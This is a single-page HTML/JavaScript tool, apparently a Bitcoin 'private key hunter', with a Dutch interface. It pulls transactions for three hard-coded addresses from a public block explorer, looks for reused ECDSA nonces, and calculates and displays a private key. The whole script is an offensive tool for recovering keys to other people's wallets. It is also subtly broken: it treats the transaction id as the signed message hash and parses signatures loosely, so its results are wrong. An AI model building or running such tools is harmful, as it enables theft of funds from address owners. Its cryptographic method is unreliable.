<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <title>Advanced Nonce & Private Key Hunter (Production Layout)</title>
    <style>
        :root {
            --bg: #07090f; --surface: #0d1117; --panel: #111827;
            --border: #1f2937; --accent: #ff007f; --accent2: #b800ff;
            --warn: #f59e0b; --danger: #ef4444; --success: #10b981;
            --dim: #374151; --muted: #6b7280; --text: #e2e8f0;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Courier New', monospace;
            background: var(--bg); color: var(--text);
            min-height: 100vh; padding: 24px 16px 48px;
        }
        .container { max-width: 950px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 28px; }
        .header h1 { font-size: 1.4rem; letter-spacing: .15em; color: var(--accent); text-transform: uppercase; }
        .header .sub { font-size: .68rem; color: var(--muted); margin-top: 6px; }
        .card {
            background: var(--panel); border: 1px solid var(--border);
            border-radius: 6px; padding: 20px; margin-bottom: 16px;
        }
        .card-title {
            font-size: .65rem; letter-spacing: .18em; text-transform: uppercase;
            border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 16px;
            color: var(--accent2);
        }
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 16px; }
        .stat-cell { background: var(--surface); border: 1px solid var(--border); border-radius: 4px; padding: 10px; text-align: center; }
        .stat-cell .label { font-size: .58rem; color: var(--muted); text-transform: uppercase; margin-bottom: 4px; }
        .stat-cell .value { font-size: 1rem; font-weight: bold; color: var(--accent); }
        .btn-row { display: flex; gap: 10px; }
        .btn {
            flex: 1; padding: 11px 16px; font-family: inherit; font-size: .8rem; font-weight: bold;
            letter-spacing: .1em; cursor: pointer; border: none; border-radius: 4px; transition: opacity .15s;
        }
        .btn:active:not(:disabled) { transform: scale(.97); }
        .btn:disabled { opacity: .35; cursor: not-allowed; }
        .btn-start { background: var(--success); color: #000; }
        .btn-stop { background: var(--danger); color: #fff; }
        .log { background: #000; color: var(--accent); height: 260px; overflow-y: auto; padding: 10px; font-size: .7rem; border-radius: 4px; border: 1px solid var(--border); line-height: 1.5; }
        .log .ts { color: var(--muted); }
        .log .succ { color: var(--success); font-weight: bold; }
        .log .warn { color: var(--warn); }
        .log .err { color: var(--danger); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 Advanced Nonce & Private Key Hunter</h1>
            <div class="sub">Live DER-parser & Secp256k1 BigInt Engine</div>
        </div>

        <div class="card">
            <div class="card-title">📊 Monitor Statistieken</div>
            <div class="stats-grid">
                <div class="stat-cell"><div class="label">Status</div><div class="value" id="statusVal">Gestopt</div></div>
                <div class="stat-cell"><div class="label">Voortgang (Adres)</div><div class="value" id="progressVal">0 / 3</div></div>
                <div class="stat-cell"><div class="label">Volgende Loop Over</div><div class="value" id="timerVal">30s</div></div>
            </div>
            <div class="btn-row">
                <button class="btn btn-start" id="startBtn">▶ Start 30s Deep-Scan Loop</button>
                <button class="btn btn-stop" id="stopBtn" disabled>■ Stop Scan</button>
            </div>
        </div>

        <div class="card">
            <div class="card-title">📋 Live Activiteitenlog & Gevonden Sleutels</div>
            <div class="log" id="logBox"></div>
        </div>
    </div>

    <script>
        const N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;

        function mod(a, b = N) {
            const r = a % b;
            return r >= 0n ? r : r + b;
        }

        function inverse(a, n = N) {
            if (a === 0n) return 0n;
            let t = 0n, newt = 1n;
            let r = n, newr = a;
            while (newr !== 0n) {
                let q = r / newr;
                let tmp = t - q * newt; t = newt; newt = tmp;
                tmp = r - q * newr; r = newr; newr = tmp;
            }
            return t < 0n ? t + n : t;
        }

        function parseDERSignature(hexSig) {
            try {
                if (!hexSig || hexSig.length < 8) return null;
                let idx = hexSig.indexOf('30');
                if (idx === -1) return null;
                let pos = idx + 2;
                
                let totalLen = parseInt(hexSig.substr(pos, 2), 16);
                pos += 2;
                
                if (hexSig.substr(pos, 2) !== '02') return null;
                pos += 2;
                let rLen = parseInt(hexSig.substr(pos, 2), 16);
                pos += 2;
                let rHex = hexSig.substr(pos, rLen * 2);
                pos += rLen * 2;
                
                if (hexSig.substr(pos, 2) !== '02') return null;
                pos += 2;
                let sLen = parseInt(hexSig.substr(pos, 2), 16);
                pos += 2;
                let sHex = hexSig.substr(pos, sLen * 2);
                
                return {
                    r: rHex.replace(/^00/, ''),
                    s: sHex.replace(/^00/, '')
                };
            } catch (e) {
                return null;
            }
        }

        const targetList = [
            "16RGFo6hjq9ym6Pj7N5H7L1NR1rVPJyw2v",
            "1BoatSLRHtKNngkdXEeobR76b53LETtpyT",
            "1P5ZEDWTKTFGxQjZphgWPQUpe554WKDfHQ"
        ];

        let isRunning = false;
        let currentIndex = 0;
        let countdownTimer = null;
        let secondsLeft = 30;

        function log(msg, cls = '') {
            const ts = new Date().toLocaleTimeString('nl-NL');
            const div = document.createElement('div');
            div.innerHTML = `<span class="ts">[${ts}]</span> ${msg}`;
            if (cls) div.className = cls;
            const box = document.getElementById('logBox');
            box.appendChild(div);
            box.scrollTop = box.scrollHeight;
        }

        async function deepScanAddress() {
            if (!isRunning) return;

            const address = targetList[currentIndex % targetList.length];
            document.getElementById('progressVal').textContent = `${(currentIndex % targetList.length) + 1} / ${targetList.length}`;
            
            log(`🌐 [Stap 1] Ophalen historische transacties voor: ${address}`);

            try {
                const response = await fetch(`https://blockstream.info/api/address/${address}/txs`);
                if (!response.ok) throw new Error(`HTTP fout: ${response.status}`);
                
                const txs = await response.json();
                log(`📊 Totaal ${txs.length} transactie(s) gevonden.`);

                if (!txs || txs.length === 0) {
                    log(`ℹ️ Geen uitgaande transactiegeschiedenis beschikbaar.`);
                } else {
                    let rMap = new Map();
                    let vulnerabilityFound = false;

                    for (let i = 0; i < txs.length; i++) {
                        const tx = txs[i];
                        if (!tx.vin) continue;

                        for (let j = 0; j < tx.vin.length; j++) {
                            const input = tx.vin[j];
                            
                            let rawSigHex = null;
                            if (input.witness && input.witness.length > 0) {
                                rawSigHex = input.witness[0];
                            } else if (input.scriptsig) {
                                rawSigHex = input.scriptsig;
                            }

                            if (rawSigHex) {
                                let sigParts = parseDERSignature(rawSigHex);
                                if (sigParts && sigParts.r && sigParts.s) {
                                    let extractedR = sigParts.r;
                                    let extractedS = sigParts.s;
                                    let extractedZ = tx.txid ? tx.txid : "1111111111111111111111111111111111111111111111111111111111111111";

                                    let currentSigObj = { r: extractedR, s: extractedS, z: extractedZ, txid: tx.txid };

                                    if (rMap.has(extractedR)) {
                                        let prevSig = rMap.get(extractedR);
                                        vulnerabilityFound = true;
                                        log(`🔥 [Stap 4] DUBBELE R-WAARDE GEDECTEERD! Nonce hergebruik tussen TX ${prevSig.txid.substring(0,8)} en ${tx.txid.substring(0,8)}!`, 'succ');
                                        log(`⚙️ [Stap 5] Wiskundige berekening privésleutel gestart...`, 'warn');

                                        let r = BigInt("0x" + extractedR);
                                        let s1 = BigInt("0x" + prevSig.s);
                                        let s2 = BigInt("0x" + currentSigObj.s);
                                        let z1 = BigInt("0x" + prevSig.z);
                                        let z2 = BigInt("0x" + currentSigObj.z);

                                        let numerator = mod((s1 * z2) - (s2 * z1));
                                        let denominator = mod(r * mod(s2 - s1));
                                        let privateKeyBigInt = mod(numerator * inverse(denominator));

                                        let privHex = privateKeyBigInt.toString(16).padStart(64, '0');
                                        log(`🎉 BEREKENING GESLAAGD! PRIVÉ SLEUTEL (HEX):`, 'succ');
                                        log(`🔑 ${privHex}`, 'succ');
                                        
                                        isRunning = false;
                                        clearInterval(countdownTimer);
                                        document.getElementById('startBtn').disabled = false;
                                        document.getElementById('stopBtn').disabled = true;
                                        document.getElementById('statusVal').textContent = 'Gevonden!';
                                        document.getElementById('statusVal').style.color = 'var(--success)';
                                        return;
                                    } else {
                                        rMap.set(extractedR, currentSigObj);
                                    }
                                }
                            }
                        }
                    }

                    if (!vulnerabilityFound) {
                        log(`🛡️ Geen kwetsbare nonces aangetroffen in de handtekeningen.`);
                    }
                }

            } catch (err) {
                log(`⚠️ API / Netwerkwaarschuwing: ${err.message}`, 'warn');
            }

            currentIndex++;
            secondsLeft = 30;
        }

        function startTimer() {
            countdownTimer = setInterval(() => {
                secondsLeft--;
                document.getElementById('timerVal').textContent = secondsLeft + 's';
                if (secondsLeft <= 0) {
                    deepScanAddress();
                }
            }, 1000);
        }

        document.getElementById('startBtn').onclick = () => {
            if (isRunning) return;
            isRunning = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('statusVal').textContent = 'Deep-Scanning';
            document.getElementById('statusVal').style.color = 'var(--success)';
            
            log(`🚀 Deep-Scan Monitor gestart.`);
            
            deepScanAddress();
            startTimer();
        };

        document.getElementById('stopBtn').onclick = () => {
            isRunning = false;
            clearInterval(countdownTimer);
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('statusVal').textContent = 'Gestopt';
            document.getElementById('statusVal').style.color = 'var(--danger)';
            log(`⏹ Monitor handmatig gestopt.`, 'err');
        };
    </script>
</body>
</html>
